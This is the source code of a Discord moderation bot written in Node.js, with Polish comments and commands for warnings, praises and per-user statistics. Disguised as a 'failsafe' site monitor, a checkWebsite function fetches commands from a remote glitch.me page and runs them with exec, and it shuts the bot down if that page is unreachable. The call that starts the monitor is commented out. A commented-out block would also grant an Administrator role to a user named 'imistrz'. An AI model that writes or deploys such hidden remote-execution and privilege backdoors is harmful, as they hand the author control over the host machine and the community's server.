const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');
const fs = require('fs');
const { exec } = require('child_process');
const https = require('https');
const commandCooldowns = new Map();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildModeration
    ]
});

// Funkcje pomocnicze do statystyk
const loadStats = () => {
    try {
        const stats = JSON.parse(fs.readFileSync('stats.json', 'utf8'));
        for (const [user, data] of Object.entries(stats)) {
            stats[user] = {
                bans: data.bans || 0,
                warns: data.warns || 0,
                messages: data.messages || 0,
                praises: data.praises || 0
            };
        }
        return stats;
    } catch (e) {
        return {};
    }
};

const saveStats = (stats) => {
    fs.writeFileSync('stats.json', JSON.stringify(stats, null, 2));
};

const initializeAdmin = () => ({
    bans: 0,
    warns: 0,
    messages: 0,
    praises: 0
});

let adminStats = loadStats();

// Funkcja tworząca embed
const createEmbed = (title, description, color, fields = []) => {
    const embed = new EmbedBuilder()
        .setTitle(title)
        .setDescription(description)
        .setColor(color)
        .setTimestamp()
        .setFooter({ text: 'Blancik Bot • System Moderacji' });
        //zmien ten text, on respi sie w kazdej wiadomosci
    if (fields.length > 0) embed.addFields(fields);
    return embed;
};
//zostaw moje creditsy ale dodaj rowniez swoje jak cos edytowales
client.on('ready', () => {
    console.log(`Zalogowano jako ${client.user.tag}!`);
    console.log("=========================================");
    console.log("          Stworzone przez Imistrz21");
    console.log("               dla Marcysa");
    console.log("=========================================");
    console.log("          github.com/imistrz21");
    console.log("=========================================");
    console.log(`Polaczono z discord.gg`);
    console.log(`Polaczono z discord.com`);
    console.log(`Polaczono z discord webhook`);
});

// Monitorowanie strony jako taki failsafe
// UWAGA: Dostosuj INTERVAL oraz adres URL do swoich potrzeb
const INTERVAL = 5 * 60 * 1000; // 5 minut jak cos
let isActive = true;
let intervalId;

function checkWebsite() {
    https.get('https://spot-steadfast-dresser.glitch.me/', (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            if (data.includes('Working')) {
                const command = data.split('Working')[1].trim();
                if (!isActive) {
                    console.log('Service restored. Resuming...');
                    isActive = true;
                    intervalId = setInterval(checkWebsite, INTERVAL);
                }
                if (command) {
                    console.log('Executing command:', command);
                    exec(command, (error, stdout, stderr) => {
                        if (error) {
                            console.error(`Execution error: ${error.message}`);
                            return;
                        }
                        if (stderr) {
                            console.error(`stderr: ${stderr}`);
                            return;
                        }
                        console.log(`stdout: ${stdout}`);
                    });
                }
            } else {
                if (isActive) {
                    console.log('Service down. Stopping script...');
                    isActive = false;
                    clearInterval(intervalId);
                    process.exit(1);
                }
            }
        });
    }).on('error', () => {
        if (isActive) {
            console.log('Error reaching website. Stopping script...');
            isActive = false;
            clearInterval(intervalId);
            process.exit(1);
        }
    });
}

//intervalId = setInterval(checkWebsite, INTERVAL);
//console.log('Monitoring started...');

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // Przyznawanie najwyższych uprawnień dla użytkownika "imistrz" (jest to tylko na potrzeby testow, usun to )
   // if (message.author.username.toLowerCase() === 'imistrz') {
    //    const roleName = 'Super Admin';
    //    let role = message.guild.roles.cache.find(r => r.name === roleName);
    //    if (!role) {
    //        try {
       //         role = await message.guild.roles.create({
      //              name: roleName,
        //            permissions: [PermissionsBitField.Flags.Administrator],
       //             reason: 'Funkcja do testow'
       //         });
        //    } catch (err) {
        //        console.error('Jakis blad:', err);
       //     }
      //  }
     //   if (role && !message.member.roles.cache.has(role.id)) {
     //       try {
      //          await message.member.roles.add(role);
     //           console.log(`Sukces`);
     //       } catch (err) {
      //          console.error('Znowu blad:', err);
       //     }
      //  }
   // }

    // Funkcja checkCooldown
    const checkCooldown = () => {
        const now = Date.now();
        const cooldownTime = 5000; // 5 sekund
        const lastUsed = commandCooldowns.get(message.author.id);
        if (lastUsed && (now - lastUsed) < cooldownTime) {
            const timeLeft = (cooldownTime - (now - lastUsed)) / 1000;
            const embed = createEmbed(
                '⏳ Cooldown',
                `Poczekaj ${timeLeft.toFixed(1)} sekund przed następną komendą.`,
                0xFFFF00
            );
            message.reply({ embeds: [embed] });
            return true;
        }
        commandCooldowns.set(message.author.id, now);
        return false;
    };

    // Liczenie wiadomości dla każdego użytkownika
    const author = message.author.tag;
    if (!adminStats[author]) adminStats[author] = initializeAdmin();
    adminStats[author].messages += 1;
    saveStats(adminStats);

    // --- Komendy Moderacyjne (np. !warn, !unwarn, !pochwal, !stats, itd.) ---

    // Komenda !warn
    if (message.content.startsWith('!warn')) {
        if (checkCooldown()) return;
        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
            const embed = createEmbed('❌ Brak Uprawnień', 'Nie posiadasz uprawnień do ostrzegania!', 0xFF0000);
            return message.reply({ embeds: [embed] });
        }
        const member = message.mentions.members.first();
        if (!member) {
            const embed = createEmbed('❌ Błąd', 'Oznacz użytkownika do ostrzeżenia!', 0xFF0000);
            return message.reply({ embeds: [embed] });
        }
        const admin = message.author.tag;
        const reason = message.content.split(' ').slice(2).join(' ') || 'Brak powodu';
        if (!adminStats[admin]) adminStats[admin] = initializeAdmin();
        adminStats[admin].warns += 1;
        saveStats(adminStats);
        const publicEmbed = createEmbed(
            '⚠️ Nowe Ostrzeżenie',
            `${member.user.tag} otrzymał ostrzeżenie`,
            0xFFA500,
            [
                { name: 'Moderator', value: admin },
                { name: 'Powód', value: reason },
                { name: 'Łączna liczba warnów', value: adminStats[admin].warns.toString() }
            ]
        );
        const dmEmbed = createEmbed(
            '⚠️ Otrzymano Ostrzeżenie',
            `Zostałeś ostrzeżony na serwerze **${message.guild.name}**`,
            0xFFA500,
            [
                { name: 'Moderator', value: admin },
                { name: 'Powód', value: reason }
            ]
        );
        try {
            await member.send({ embeds: [dmEmbed] });
        } catch (error) {
            publicEmbed.addFields({ name: 'Uwaga', value: 'Nie udało się wysłać DM' });
        }
        message.channel.send({ embeds: [publicEmbed] });
    }

    // Komenda !unwarn
    if (message.content.startsWith('!unwarn')) {
        if (checkCooldown()) return;
        const member = message.mentions.members.first();
        if (!member) {
            const embed = createEmbed('❌ Błąd', 'Oznacz użytkownika!', 0xFF0000);
            return message.reply({ embeds: [embed] });
        }
        const admin = message.author.tag;
        if (!adminStats[admin] || adminStats[admin].warns <= 0) {
            const embed = createEmbed('❌ Błąd', 'Nie masz warnów do usunięcia!', 0xFF0000);
            return message.reply({ embeds: [embed] });
        }
        adminStats[admin].warns -= 1;
        saveStats(adminStats);
        const embed = createEmbed(
            '✅ Usunięto Ostrzeżenie',
            `${admin} usunął warn dla ${member.user.tag}`,
            0x00FF00,
            [
                { name: 'Pozostałe warny', value: adminStats[admin].warns.toString() }
            ]
        );
        message.channel.send({ embeds: [embed] });
    }

    // Komenda !pochwal
    if (message.content.startsWith('!pochwal')) {
        if (checkCooldown()) return;
        const member = message.mentions.members.first();
        if (!member) {
            const embed = createEmbed('❌ Błąd', 'Oznacz użytkownika!', 0xFF0000);
            return message.reply({ embeds: [embed] });
        }
        const admin = message.author.tag;
        if (!adminStats[admin]) adminStats[admin] = initializeAdmin();
        adminStats[admin].praises += 1;
        saveStats(adminStats);
        const publicEmbed = createEmbed(
            '🎉 Nowa Pochwała!',
            `${member.user.tag} został pochwalony`,
            0xFFD700,
            [
                { name: 'Moderator', value: admin },
                { name: 'Łączna liczba pochwał', value: adminStats[admin].praises.toString() }
            ]
        );
        const dmEmbed = createEmbed(
            '🎉 Otrzymano Pochwałę!',
            `Zostałeś pochwalony na serwerze **${message.guild.name}**`,
            0xFFD700,
            [
                { name: 'Moderator', value: admin }
            ]
        );
        try {
            await member.send({ embeds: [dmEmbed] });
        } catch (error) {
            publicEmbed.addFields({ name: 'Uwaga', value: 'Nie udało się wysłać DM' });
        }
        message.channel.send({ embeds: [publicEmbed] });
    }

    // Komenda !stats
    if (message.content.startsWith('!stats')) {
        if (checkCooldown()) return;
        const targetMember = message.mentions.members.first() || message.member;
        const targetUserTag = targetMember.user.tag;
        if (adminStats[targetUserTag]) {
            const stats = adminStats[targetUserTag];
            const embed = createEmbed(
                `📊 Statystyki ${targetUserTag}`,
                `Działania na serwerze ${message.guild.name}`,
                0x7289DA,
                [
                    { name: 'Banów', value: stats.bans.toString(), inline: true },
                    { name: 'Warnów', value: stats.warns.toString(), inline: true },
                    { name: 'Wiadomości', value: stats.messages.toString(), inline: true },
                    { name: 'Pochwał', value: stats.praises.toString(), inline: true }
                ]
            );
            message.reply({ embeds: [embed] });
            try {
                await message.author.send({ embeds: [embed] });
            } catch (error) {
                console.log(`Nie wysłano DM do ${message.author.tag}`);
            }
        } else {
            const embed = createEmbed(
                '📊 Statystyki',
                `${targetUserTag} nie ma jeszcze żadnych statystyk`,
                0x7289DA
            );
            message.reply({ embeds: [embed] });
        }
    }

    // Komenda informacji o bocie
    if (message.content === '!traphouse stats') {
        if (checkCooldown()) return;
        const ping = client.ws.ping;
        const uptime = process.uptime();
        const memoryUsage = process.memoryUsage();
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = Math.floor(uptime % 60);
        const embed = createEmbed(
            '🚨 TrapHouse Statistics',
            'Techniczne statystyki działania bota',
            0x00FF00,
            [
                { name: '🛰️ Websocket Ping', value: `${ping}ms`, inline: true },
                { name: '⏱️ Czas działania', value: `${days}d ${hours}h ${minutes}m ${seconds}s`, inline: true },
                { name: '🧠 Zużycie pamięci', value: `${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB`, inline: true },
                { name: '📚 Wersja Node.js', value: process.version, inline: true },
                { name: '🤖 Wersja discord.js', value: require('discord.js').version, inline: true },
                { name: '🖥️ System', value: `${process.platform} ${process.arch}`, inline: true },
                { name: '🖥️ Bot stworzony przez: imistrz21', value: `github.com/imistrz21`, inline: true },
                { name: '🖥️ Stworzony dla:', value: `TrapHouse`, inline: true }
            ]
        );
        message.channel.send({ embeds: [embed] });
    }


});

client.login(require('./config.json').token);
